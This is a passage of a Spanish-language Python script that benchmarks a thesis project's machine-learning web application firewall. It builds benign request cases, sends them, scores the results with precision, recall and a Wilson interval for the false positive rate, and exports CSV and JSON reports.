        "headers": None, "expected": "ALLOW",
    })

    # ── 12. User-Agent variados (3 casos) ─────────────────────
    for ua_name, ua_value in [
        ("Chrome Win", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/125.0.0.0 Safari/537.36"),
        ("Firefox", "Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0"),
        ("Safari iOS", "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148"),
    ]:
        cases.append({
            "id": f"VAL_UA_{len(cases)+1:03d}",
            "cwe": "CLEAN",
            "desc": f"UA: {ua_name}",
            "method": "GET",
            "path": "/api/v1/products",
            "params": {"limit": "5"},
            "data": None, "json": None,
            "headers": {"User-Agent": ua_value},
            "expected": "ALLOW",
        })

    # ── 13. Caracteres especiales en búsquedas legítimas (5 casos) ──
    for special_text in [
        "D'Onofrio",  # Apóstrofe italiano legítimo
        "Hernández",   # Acento legítimo
        "São Paulo",   # ASCII extendido
        "München",     # Umlaut legítimo
        "café",        # Acento en producto
    ]:
        cases.append({
            "id": f"VAL_SPEC_{len(cases)+1:03d}",
            "cwe": "CLEAN",
            "desc": f"Búsqueda con caracteres especiales: '{special_text}'",
            "method": "GET",
            "path": "/api/v1/clients",
            "params": {"search": special_text},
            "data": None, "json": None, "headers": None,
            "expected": "ALLOW",
        })

    # ── Ataques ampliados — 92 casos repartidos por CWE ────────
    for cwe, desc, method, path, params, data in VALIDATION_ATTACKS_EXPANDED:
        cases.append({
            "id": f"VAL_ATT_{len(cases)+1:03d}",
            "cwe": cwe,
            "desc": desc,
            "method": method,
            "path": path,
            "params": params,
            "data": data,
            "json": None, "headers": None,
            "expected": "BLOCK",
        })

    return cases


# ══════════════════════════════════════════════════════════════════
# EJECUTOR
# ══════════════════════════════════════════════════════════════════

def run_suite(name: str, cases: list[dict]) -> list[dict]:
    """Ejecuta una suite de casos y retorna resultados."""
    total = len(cases)
    attacks = [c for c in cases if c["expected"] == "BLOCK"]
    clean = [c for c in cases if c["expected"] == "ALLOW"]

    print(f"\n{'─' * 65}")
    print(f"  {name}")
    print(f"  Ataques: {len(attacks)}  |  Limpio: {len(clean)}  |  Total: {total}")
    print(f"{'─' * 65}")

    results = []
    for i, case in enumerate(cases, 1):
        status, waf_action, waf_score, error = send_request(
            case["method"], case["path"],
            params=case["params"],
            data=case["data"],
            json_body=case["json"],
            headers=case["headers"],
        )
        result = classify(case["expected"], status, waf_action)

        entry = {
            "id": case["id"],
            "cwe": case["cwe"],
            "desc": case["desc"],
            "method": case["method"],
            "path": case["path"],
            "expected": case["expected"],
            "status": status,
            "waf_action": waf_action,
            "waf_score": waf_score,
            "result": result,
            "error": error,
        }
        results.append(entry)

        # Progress
        if result in ("FP", "FN") or i == total or i % 20 == 0:
            icon = "✓" if result in ("TP", "TN") else "✗"
            pct = i / total * 100
            bar = "█" * int(pct // 5) + "░" * (20 - int(pct // 5))
            print(f"    [{bar}] {i:>3}/{total} ({pct:>5.1f}%)  "
                  f"{icon} {result:4s}  {case['id'][:18]:18s}  HTTP {status}"
                  + (f" [{waf_action}]" if waf_action else "")
                  + (f"  {error}" if error else ""))

    return results


# ══════════════════════════════════════════════════════════════════
# MÉTRICAS
# ══════════════════════════════════════════════════════════════════

def compute_metrics(results: list[dict], label: str) -> dict:
    """Calcula métricas a partir de los resultados de una suite."""
    tp = sum(1 for r in results if r["result"] == "TP")
    tn = sum(1 for r in results if r["result"] == "TN")
    fp = sum(1 for r in results if r["result"] == "FP")
    fn = sum(1 for r in results if r["result"] == "FN")
    total = len(results)

    # Ataques y limpios
    attacks = [r for r in results if r["expected"] == "BLOCK"]
    clean = [r for r in results if r["expected"] == "ALLOW"]
    attack_tp = sum(1 for r in attacks if r["result"] == "TP")
    attack_fn = sum(1 for r in attacks if r["result"] == "FN")
    clean_tn = sum(1 for r in clean if r["result"] == "TN")
    clean_fp = sum(1 for r in clean if r["result"] == "FP")

    # Latencia (desde timedelta en nanosegundos... no medimos precise aquí)
    # Se omite latencia en esta versión (el benchmark_waf.py ya la mide)

    safe = lambda a, b: round(a / b * 100, 2) if b else 0.0
    precision = safe(tp, tp + fp)
    recall = safe(tp, tp + fn)
    f1 = round(2 * precision * recall / (precision + recall), 2) if (precision + recall) > 0 else 0.0
    fpr = safe(fp, fp + tn)
    accuracy = safe(tp + tn, total)
    attack_dr = safe(attack_tp, attack_tp + attack_fn)
    clean_spec = safe(clean_tn, clean_tn + clean_fp)

    # ── Wilson CI para FPR ─────────────────────────────────────
    # FPR = FP / (FP + TN). k = FP, n = FP + TN
    wilson_lower, wilson_center, wilson_upper = wilson_ci(fp, fp + tn)

    return {
        "suite": label,
        "total": total,
        "attack_total": len(attacks),
        "clean_total": len(clean),
        "tp": tp, "tn": tn, "fp": fp, "fn": fn,
        "accuracy_pct": accuracy,
        "precision_pct": precision,
        "recall_pct": recall,
        "f1_pct": f1,
        "fpr_pct": fpr,
        "attack_detection_rate_pct": attack_dr,
        "clean_specificity_pct": clean_spec,
        "fpr_wilson_95_ci_lower_pct": round(wilson_lower * 100, 4),
        "fpr_wilson_95_ci_center_pct": round(wilson_center * 100, 4),
        "fpr_wilson_95_ci_upper_pct": round(wilson_upper * 100, 4),
    }


def print_metrics(m: dict):
    """Imprime métricas formateadas."""
    print(f"\n{'═' * 55}")
    print(f"  📊 {m['suite']}")
    print(f"{'═' * 55}")
    print(f"  Total:       {m['total']}  (ataques: {m['attack_total']}, limpio: {m['clean_total']})")
    print(f"  TP: {m['tp']}   TN: {m['tn']}   FP: {m['fp']}   FN: {m['fn']}")
    print(f"{'─' * 55}")
    print(f"  Accuracy:    {m['accuracy_pct']:.2f}%")
    print(f"  Precision:   {m['precision_pct']:.2f}%")
    print(f"  Recall:      {m['recall_pct']:.2f}%")
    print(f"  F1 Score:    {m['f1_pct']:.2f}%")
    print(f"  FPR:         {m['fpr_pct']:.2f}%")
    print(f"  Detección:   {m['attack_detection_rate_pct']:.2f}%")
    print(f"  Especificidad: {m['clean_specificity_pct']:.2f}%")
    print(f"{'─' * 55}")
    print(f"  Intervalo de Confianza de Wilson (95%) para FPR:")
    print(f"    {m['fpr_wilson_95_ci_lower_pct']:.4f}%  ≤  "
          f"{m['fpr_wilson_95_ci_center_pct']:.4f}%  ≤  "
          f"{m['fpr_wilson_95_ci_upper_pct']:.4f}%")
    print(f"{'═' * 55}")


# ══════════════════════════════════════════════════════════════════
# EXPORTACIÓN
# ══════════════════════════════════════════════════════════════════

def export_csv(results: list[dict], metrics: dict, prefix: str):
    """Exporta resultados a CSV."""
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    os.makedirs(OUTPUT_DIR, exist_ok=True)

    # Detallado
    path = os.path.join(OUTPUT_DIR, f"{prefix}_{ts}.csv")
    fieldnames = ["id", "cwe", "desc", "method", "path", "expected",
                  "status", "waf_action", "waf_score", "result", "error"]
    with open(path, "w", newline="", encoding="utf-8") as f:
        writer = csv.DictWriter(f, fieldnames=fieldnames)
        writer.writeheader()
        for r in results:
            writer.writerow({k: r.get(k, "") for k in fieldnames})
    print(f"\n  📄 CSV → {path}")

    # Métricas
    path_m = os.path.join(OUTPUT_DIR, f"{prefix}_metrics_{ts}.csv")
    with open(path_m, "w", newline="", encoding="utf-8") as f:
        writer = csv.DictWriter(f, fieldnames=list(metrics.keys()))
        writer.writeheader()
        writer.writerow(metrics)
    print(f"  📄 Métricas → {path_m}")


def export_json(all_metrics: list[dict], all_results: dict, prefix: str):
    """Exporta resultados completos a JSON."""
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    os.makedirs(OUTPUT_DIR, exist_ok=True)

    report = {
        "metadata": {
            "titulo": "WAF-ML — Prueba de Validación Estadística",
            "waf_url": WAF_URL,
            "umbrales": {"log": THRESHOLD_LOG, "block": THRESHOLD_BLOCK},
            "tesis": "WAF open source basado en ML para detección de ataques de inyección OWASP A05:2025 en entornos PYMES",
            "autor": "Fernandez Alva, E.",
            "universidad": "USAT - Perú",
            "fecha": datetime.now().isoformat(),
            "nota_metodologica": (
                "El intervalo de confianza de Wilson (1927) se calcula para el FPR "
                "(False Positive Rate = FP / (FP + TN)). Utiliza la distribución "
                "binomial exacta corregida y es más preciso que el intervalo de Wald "
                "clásico para proporciones cercanas a 0, como es el caso del FPR esperado."
            ),
        },
        "suites": {
            m["suite"]: {
                "metricas": m,
                "resultados": all_results.get(m["suite"], []),
            }
            for m in all_metrics
        },
    }

    path = os.path.join(OUTPUT_DIR, f"{prefix}_{ts}.json")
    with open(path, "w", encoding="utf-8") as f:
        json.dump(report, f, indent=2, ensure_ascii=False)
    print(f"  📄 JSON → {path}")


# ══════════════════════════════════════════════════════════════════
# VERIFICACIÓN DE SALUD
# ══════════════════════════════════════════════════════════════════

def check_health():
    """Verifica que el WAF responda."""
    try:
        r = requests.get(f"{WAF_URL}/health", timeout=5)
        ok = r.status_code in (200, 404)
        print(f"    {'✅' if ok else '❌'} WAF-ML → {WAF_URL}  {'RESPONDE' if ok else 'SIN RESPUESTA'}")
        return ok
    except Exception:
        print(f"    ❌ WAF-ML → {WAF_URL}  SIN RESPUESTA")
        return False


# ══════════════════════════════════════════════════════════════════
# MAIN
# ══════════════════════════════════════════════════════════════════

def main():
    print(f"\n{'═' * 65}")
    print(f"  🧪 WAF-ML — PRUEBA DE VALIDACIÓN ESTADÍSTICA")
    print(f"  Tesis: WAF open source basado en ML para la detección")
    print(f"         de ataques de inyección en entornos PYMES")
    print(f"  Autor: Fernandez Alva, E. — USAT, Perú 2026")
    print(f"  Fecha: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"  WAF:   {WAF_URL}")
    print(f"{'═' * 65}")

    # Verificar conectividad
    print(f"\n  🔍 Verificando conectividad...")
    if not check_health():
        print(f"\n  ⚠️  El WAF no responde en {WAF_URL}")
        yn = input("  ¿Continuar de todas formas? (s/N): ").strip().lower()
        if yn != "s":
            print("  Abortado.")
            return

    # ── Fase 1: Prueba Piloto ─────────────────────────────────
    pilot_cases = []
    for desc, method, path, params, data in PILOT_ATTACKS:
        pilot_cases.append({
            "id": desc, "cwe": "ATTACK", "desc": desc,
            "method": method, "path": path,
            "params": params, "data": data,
            "json": None, "headers": None, "expected": "BLOCK",
        })
    for desc, method, path, params, data in PILOT_CLEAN:
        pilot_cases.append({
            "id": desc, "cwe": "CLEAN", "desc": desc,
            "method": method, "path": path,
            "params": params, "data": data,
            "json": None, "headers": None, "expected": "ALLOW",
        })

    pilot_results = run_suite("Fase 1 — Prueba Piloto", pilot_cases)
    pilot_metrics = compute_metrics(pilot_results, "Fase 1 — Prueba Piloto")
    print_metrics(pilot_metrics)

    # ── Fase 2: Prueba de Validación Estadística ──────────────
    val_cases = build_validation_cases()
    val_results = run_suite("Fase 2 — Prueba de Validación Estadística", val_cases)
    val_metrics = compute_metrics(val_results, "Fase 2 — Prueba de Validación Estadística")
    print_metrics(val_metrics)

    # ── Tabla comparativa ─────────────────────────────────────
    print(f"\n{'═' * 65}")
    print(f"  📊 TABLA COMPARATIVA")
    print(f"{'═' * 65}")
    print(f"{'Métrica':<30} {'Piloto (31)':>14} {'Validación':>14}")
    print(f"{'─' * 60}")
    for key, label in [
        ("total", "Total casos"),
        ("tp", "TP"), ("tn", "TN"), ("fp", "FP"), ("fn", "FN"),
        ("accuracy_pct", "Accuracy (%)"),
        ("precision_pct", "Precision (%)"),
        ("recall_pct", "Recall (%)"),
        ("f1_pct", "F1 Score (%)"),
        ("fpr_pct", "FPR (%)"),
        ("attack_detection_rate_pct", "Detección ataques (%)"),
        ("clean_specificity_pct", "Especificidad (%)"),
    ]:
        v1 = pilot_metrics.get(key, "")
        v2 = val_metrics.get(key, "")
        if isinstance(v1, (int, float)):
            print(f"  {label:<28} {v1:>14}  {v2:>14}")
        else:
            print(f"  {label:<28} {str(v1):>14}  {str(v2):>14}")
    print(f"{'─' * 60}")
    print(f"  Wilson 95% CI (FPR)")
    for key, label in [
        ("fpr_wilson_95_ci_lower_pct", "Límite inferior"),
        ("fpr_wilson_95_ci_center_pct", "Centro"),
        ("fpr_wilson_95_ci_upper_pct", "Límite superior"),
    ]:
        v1 = pilot_metrics.get(key, "")
        v2 = val_metrics.get(key, "")
        print(f"    {label:<26} {v1:>14}%  {v2:>14}%")

    # ── Exportar ──────────────────────────────────────────────
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    export_csv(pilot_results, pilot_metrics, f"piloto_{ts}")
    export_csv(val_results, val_metrics, f"validacion_{ts}")
    export_json(
        [pilot_metrics, val_metrics],
        {"Fase 1 — Prueba Piloto": pilot_results, "Fase 2 — Prueba de Validación Estadística": val_results},
        f"reporte_validacion_{ts}",
    )

    print(f"\n{'═' * 65}")
    print(f"  ✅ PRUEBA DE VALIDACIÓN COMPLETADA")
    print(f"  Resultados guardados en: {OUTPUT_DIR}")
    print(f"{'═' * 65}")
    print(f"\n  Resumen:")
    print(f"  Fase 1 (Piloto): {pilot_metrics['total']} casos → "
          f"FPR {pilot_metrics['fpr_pct']:.2f}%  "
          f"[Wilson 95%: {pilot_metrics['fpr_wilson_95_ci_lower_pct']:.4f}% – "
          f"{pilot_metrics['fpr_wilson_95_ci_upper_pct']:.4f}%]")
    print(f"  Fase 2 (Validación): {val_metrics['total']} casos → "
          f"FPR {val_metrics['fpr_pct']:.2f}%  "
          f"[Wilson 95%: {val_metrics['fpr_wilson_95_ci_lower_pct']:.4f}% – "
          f"{val_metrics['fpr_wilson_95_ci_upper_pct']:.4f}%]")
    print()


if __name__ == "__main__":
    main()
